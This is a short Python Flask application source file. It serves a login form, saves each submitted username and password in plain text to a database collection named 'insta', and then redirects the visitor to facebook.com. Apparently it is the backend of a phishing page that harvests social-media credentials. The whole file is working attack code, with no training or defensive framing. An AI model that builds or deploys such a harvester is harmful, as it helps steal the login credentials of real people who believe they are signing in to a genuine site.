from flask import Flask,request,redirect,url_for,render_template
from config import Development
from creds import db
app = Flask(__name__)

app.config.from_object(Development())

@app.route('/',methods=['GET','POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        response = db.insta.insert_one({
            "username":username,
            "password":password
        })
        if response.inserted_id:
            return redirect('https://www.facebook.com/')
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host='0.0.0.0')